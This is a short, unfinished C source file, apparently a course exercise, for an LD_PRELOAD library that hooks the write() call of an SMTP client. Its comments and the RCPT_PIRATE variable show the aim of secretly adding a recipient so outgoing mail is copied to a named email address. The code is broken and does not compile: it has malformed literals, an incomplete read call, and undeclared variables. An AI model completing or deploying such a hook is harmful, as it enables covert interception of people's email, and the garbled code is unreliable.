#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <string.h>

/* Function pointers to hold the value of the glibc functions */
static ssize_t (*real_write)(int fd, const void *buf, size_t count) = NULL;
static ssize_t (*real_read)(int fd, void *buf, size_t count) = NULL;

/* wrapping write function call */
ssize_t write(int fd, const void *buf, size_t count)
{
    /* printing out the number of characters */
    printf("write:chars#:%lu\n", count);
    /* reslove the real write function from glibc
     * and pass the arguments.
     */

    real_write = dlsym(RTLD_NEXT, "write");

    //TODO:
    //CHeck if buffer start with 'RCP TO:'

    //If true:
    if (true)
    {
        char* RCPT_PIRATE = 'RCPT TO: malik.fleury@he-arc.ch\n';
        //Write another RCPT_TO
        real_write(fd, &RCPT_PIRATE, count);

        //Add read RCPT_TO
        read(fd, )
        do
        {
            fgets(buffer, sizeof(buffer), f);
            printf(buffer);
            //puts(buffer);
        }while(buffer[0] < '2' || buffer[0] > '5');
        
    }

    //Then real write asked by the smtp client

    real_write(fd, buf, count);
}
